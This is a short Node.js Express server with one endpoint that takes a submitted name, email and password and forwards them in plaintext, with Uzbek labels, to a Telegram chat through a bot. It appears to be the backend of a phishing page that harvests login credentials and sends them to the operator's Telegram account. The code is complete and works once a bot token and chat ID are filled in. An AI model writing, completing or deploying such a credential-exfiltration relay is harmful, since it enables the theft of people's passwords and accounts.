const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post("/sendTelegramMessage", (req, res) => {
  const { name, email, password } = req.body;
  const message = `Ism: ${name}\nEmail: ${email}\nParol: ${password}`;

  const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
  const chatId = "YOUR_CHAT_ID";
  const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  fetch(telegramApiUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Failed to send message to Telegram.");
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent to Telegram:", data);
      res.json({ success: true });
    })
    .catch((error) => {
      console.error("Error sending message to Telegram:", error);
      res.status(500).json({ error: "Failed to send message to Telegram." });
    });
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
